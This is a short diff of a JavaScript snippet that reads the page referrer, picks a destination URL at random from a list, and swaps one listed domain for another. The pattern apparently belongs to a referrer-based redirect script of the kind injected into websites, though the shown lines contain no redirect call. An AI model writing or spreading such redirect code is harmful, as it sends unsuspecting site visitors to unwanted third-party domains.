@@ -4,7 +4,7 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
-							'https://123uver.cz',
+							'https://masranger.com/',
 							]);
 
 				function rChoice(arr) {
